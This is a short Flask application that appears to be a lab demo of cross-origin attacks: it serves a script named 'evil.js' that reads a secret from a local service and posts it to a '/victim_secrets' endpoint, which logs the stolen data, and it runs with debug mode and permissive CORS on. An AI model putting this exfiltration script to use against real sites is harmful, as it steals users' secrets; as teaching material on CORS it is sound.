from flask import Flask, render_template, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
app.TEMPLATES_AUTO_RELOAD = True
app.DEBUG = True


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/blocked-by-cors')
def blocked():
    return render_template('blocked.html')

@app.route('/working-example')
def working():
    return render_template('working.html')

@app.route('/victim_secrets', methods=["POST"])
def victim_secrets():
    """Inbound API for storing stolen secrets"""
    app.logger.info(request.json)
    return "Thanks for the secret!"


@app.route('/evil.js')
def evil_js():
    return """
        axios.get('http://localhost:5001/secret')
            .then(function (response) {
                // handle success
                console.log(response);
                axios.post('http://localhost:8666/victim_secrets', {
                    data: response.data
                })
            })
            .catch(function (error) {
                // handle error
                console.log(error);
            })
            .then(function () {
                // always executed
            });
""", {"Content-Type": "text/javascript"}
